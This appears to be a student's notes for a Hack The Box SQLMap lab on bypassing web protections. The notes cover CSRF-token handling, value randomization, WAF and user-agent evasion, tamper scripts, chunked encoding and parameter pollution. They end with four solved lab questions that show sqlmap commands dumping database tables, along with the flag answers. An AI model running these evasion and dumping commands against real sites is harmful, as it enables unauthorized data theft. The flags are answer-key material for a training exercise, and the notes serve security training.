# Bypassing Web Application Protections
## Anti-CSRF Token Bypass
By specifying the token parameter name, SQLMap will automatically attempt to parse the target response content and search for fresh token values so it can use them in the next request.

```shellsession
$ sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
```

## Unique Value Bypass
The option `--randomize` should be used, pointing to the parameter name containing a value which should be randomized before being sent:

```shellsession
$ sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch
```

## Calculated Parameter Bypass
Most often, one parameter value has to contain the message digest (e.g. `h=MD5(id)`) of another one. To bypass this, the option `--eval` should be used, where a valid Python code is being evaluated just before the request is being sent to the target:

```shellsession
$ sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch
```

## IP Address Concealing
A proxy can be set with the option `--proxy` (e.g. `--proxy="socks4://177.39.187.70:33283"`), where we should add a working proxy.

In addition to that, if we have a list of proxies, we can provide them to SQLMap with the option `--proxy-file`.

## WAF Bypass
Whenever we run SQLMap, As part of the initial tests, SQLMap sends a predefined malicious looking payload using a non-existent parameter name to test for the existence of a WAF. If we wanted to skip this heuristical test altogether (i.e., to produce less noise), we can use switch `--skip-waf`.

## User-agent Blacklisting Bypass
This is trivial to bypass with the switch `--random-agent`, which changes the default user-agent with a randomly chosen value from a large pool of values used by browsers.

## Tamper Scripts
The most notable tamper scripts are the following:

<table class="bg-neutral-800 text-primary w-full"><thead class="text-left rounded-t-lg"><tr class="border-t-neutral-600 first:border-t-0 border-t"><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4"><strong class="font-bold">Tamper-Script</strong></th><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4"><strong class="font-bold">Description</strong></th></tr></thead><tbody class="font-mono text-sm"><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">0eunion</code></td><td class="p-4">Replaces instances of <int> UNION with <int>e0UNION</int></int></td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">base64encode</code></td><td class="p-4">Base64-encodes all characters in a given payload</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">between</code></td><td class="p-4">Replaces greater than operator (<code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">&gt;</code>) with <code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">NOT BETWEEN 0 AND #</code> and equals operator (<code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">=</code>) with <code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">BETWEEN # AND #</code></td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">commalesslimit</code></td><td class="p-4">Replaces (MySQL) instances like <code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">LIMIT M, N</code> with <code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">LIMIT N OFFSET M</code> counterpart</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">equaltolike</code></td><td class="p-4">Replaces all occurrences of operator equal (<code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">=</code>) with <code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">LIKE</code> counterpart</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">halfversionedmorekeywords</code></td><td class="p-4">Adds (MySQL) versioned comment before each keyword</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">modsecurityversioned</code></td><td class="p-4">Embraces complete query with (MySQL) versioned comment</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">modsecurityzeroversioned</code></td><td class="p-4">Embraces complete query with (MySQL) zero-versioned comment</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">percentage</code></td><td class="p-4">Adds a percentage sign (<code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">%</code>) in front of each character (e.g. SELECT -&gt; %S%E%L%E%C%T)</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">plus2concat</code></td><td class="p-4">Replaces plus operator (<code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">+</code>) with (MsSQL) function CONCAT() counterpart</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">randomcase</code></td><td class="p-4">Replaces each keyword character with random case value (e.g. SELECT -&gt; SEleCt)</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">space2comment</code></td><td class="p-4">Replaces space character (<code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5"> </code>) with comments `/</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">space2dash</code></td><td class="p-4">Replaces space character (<code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5"> </code>) with a dash comment (<code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">--</code>) followed by a random string and a new line (<code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">\n</code>)</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">space2hash</code></td><td class="p-4">Replaces (MySQL) instances of space character (<code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5"> </code>) with a pound character (<code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">#</code>) followed by a random string  and a new line (<code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">\n</code>)</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">space2mssqlblank</code></td><td class="p-4">Replaces (MsSQL) instances of space character (<code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5"> </code>) with a random blank character from a valid set of alternate characters</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">space2plus</code></td><td class="p-4">Replaces space character (<code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5"> </code>) with plus (<code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">+</code>)</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">space2randomblank</code></td><td class="p-4">Replaces space character (<code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5"> </code>) with a random blank character from a valid set of alternate characters</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">symboliclogical</code></td><td class="p-4">Replaces AND and OR logical operators with their symbolic counterparts (<code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">&amp;&amp;</code> and <code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">||</code>)</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">versionedkeywords</code></td><td class="p-4">Encloses each non-function keyword with (MySQL) versioned comment</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">versionedmorekeywords</code></td><td class="p-4">Encloses each keyword with (MySQL) versioned comment</td></tr></tbody></table>

## Miscellaneous Bypasses
Out of other protection bypass mechanisms, there are also two more that should be mentioned. The first one is the Chunked transfer encoding, turned on using the switch `--chunked`, which splits the POST request's body into so-called "chunks." Blacklisted SQL keywords are split between chunks in a way that the request containing them can pass unnoticed.

The other bypass mechanisms is the `HTTP parameter pollution (HPP)`, where payloads are split in a similar way as in case of `--chunked` between different same parameter named values (e.g. `?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users`...), which are concatenated by the target platform if supporting it (e.g. ASP).

## Questions
1. What's the contents of table flag8? (Case #8) **Answer: HTB{y0u_h4v3_b33n_c5rf_70k3n1z3d}**
   - Found the csrf-token parameter name, run sqlmap with Anti-CSRF Token bypass:
        ```shellsession
        $ sqlmap -u 'http://154.57.164.69:32239/case8.php' --data "id=1*&t0ken=cS408HB1bUmxDsd6v37bbXeAAVlsfD0gd3LN58rq2E" --csrf-token "t0ken" --batch --level 5 --risk 3 -T flag8 --dump
        <SNIP>
        Database: testdb
        Table: flag8
        [1 entry]
        +----+-----------------------------------+
        | id | content                           |
        +----+-----------------------------------+
        | 1  | HTB{y0u_h4v3_b33n_c5rf_70k3n1z3d} |
        +----+-----------------------------------+
        <SNIP>
        ```
2. What's the contents of table flag9? (Case #9) **Answer: HTB{700_much_r4nd0mn355_f0r_my_74573}**
   - Run sqlmap with randomize parameter value:
        ```shellsession
        $ sqlmap -u "http://154.57.164.69:32239/case9.php?id=1*&uid=607775628" --batch --level 5 --risk 3 --threads 10 --randomize=uid -T flag9 --dump
        <SNIP>
        Database: testdb
        Table: flag9
        [1 entry]
        +----+---------------------------------------+
        | id | content                               |
        +----+---------------------------------------+
        | 1  | HTB{700_much_r4nd0mn355_f0r_my_74573} |
        +----+---------------------------------------+
        <SNIP>
        ```
3. What's the contents of table flag10? (Case #10) **Answer: HTB{y37_4n07h3r_r4nd0m1z3}**
   - Specify `--proxy` option to see how the server process sqlmap's requests → notice that because of sqlmap's `User-Agent` the server is only responding with empty 200 OK responses:
        ```shellsession
        $ sqlmap -u "http://154.57.164.69:32239/case10.php" --data "id=1*" --batch --level 5 --risk 3 --threads 10 -T flag10 --dump --proxy="http://127.0.0.1:8080"
        ```
   - Bypass this with `--random-agent`:
        ```shellsession
        $ sqlmap -u "http://154.57.164.69:32239/case10.php" --data "id=1*" --batch --level 5 --risk 3 --threads 10 -T flag10 --dump --random-agent
        <SNIP>
        Database: testdb
        Table: flag10
        [1 entry]
        +----+----------------------------+
        | id | content                    |
        +----+----------------------------+
        | 1  | HTB{y37_4n07h3r_r4nd0m1z3} |
        +----+----------------------------+
        <SNIP>
        ```
4. What's the contents of table flag11? (Case #11) **Answer: HTB{5p3c14l_ch4r5_n0_m0r3}**
   - Run sqlmap with `between` tamper script to bypass the `<`, `>` filter:
        ```shellsession
        $ sqlmap -u "http://154.57.164.78:30146/case11.php?id=1*" --batch --level 5 --risk 3 --threads 10 -T flag11 --dump --tamper=between
        <SNIP>
        Database: testdb
        Table: flag11
        [1 entry]
        +----+----------------------------+
        | id | content                    |
        +----+----------------------------+
        | 1  | HTB{5p3c14l_ch4r5_n0_m0r3} |
        +----+----------------------------+
        <SNIP>
        ```